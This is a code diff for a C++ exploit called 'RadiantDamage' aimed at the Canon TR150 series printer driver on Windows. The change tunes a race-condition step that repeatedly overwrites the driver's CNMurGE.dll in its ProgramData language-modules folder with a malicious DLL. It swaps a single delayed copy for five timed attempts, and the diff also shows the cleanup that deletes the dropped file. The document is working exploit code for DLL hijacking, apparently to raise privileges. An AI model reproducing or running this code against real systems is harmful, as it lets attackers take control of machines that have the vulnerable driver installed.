@@ -59,10 +59,13 @@ namespace
                             if (change_counter == 0)
                             {
                                 // timing attacks. amirite?
-                                std::this_thread::sleep_for(std::chrono::milliseconds(4000));
-
-                                // just try to copy. don't check error status. it doesn't matter.
-                                CopyFileA(p_malicious_dll.c_str(), p_target.c_str(), FALSE);
+                                std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+                                for (int i = 0; i < 5; i++)
+                                {
+                                    // just try to copy. don't check error status. it doesn't matter.
+                                    CopyFileA(p_malicious_dll.c_str(), p_target.c_str(), FALSE);
+                                    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+                                }
                                 return;
                             }
                         }
@@ -78,8 +81,8 @@ namespace
 }
 
 RadiantDamage::RadiantDamage() :
-	Exploit("Canon TR150 series", "RadiantDamage"),
-	m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
+    Exploit("Canon TR150 series", "RadiantDamage"),
+    m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
     m_target_dll("CNMurGE.dll")
 {
 }
@@ -158,5 +161,5 @@ bool RadiantDamage::do_exploit()
         std::cout << "[+] Cleaning up dropped dll" << std::endl;
         _unlink(m_malicious_dll.c_str());
     }
-	return true;
+    return true;
 }
